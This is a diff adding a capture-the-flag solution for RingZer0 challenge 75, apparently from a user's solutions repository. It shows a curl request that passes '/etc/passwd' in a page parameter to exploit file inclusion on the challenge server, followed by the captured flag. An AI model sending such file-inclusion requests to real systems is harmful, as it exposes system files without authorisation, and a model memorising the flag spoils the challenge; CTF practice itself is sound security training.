@@ -1,0 +1,5 @@
+# User     : ltcastelnuovo
+# Challenge: https://ringzer0ctf.com/challenges/75
+
+1. curl "http://challenges.ringzer0team.com:10075/?page=/etc/passwd" | grep -i flag
+2. FLAG-zH9g1934v774Y7Zx5s16t5ym8Z
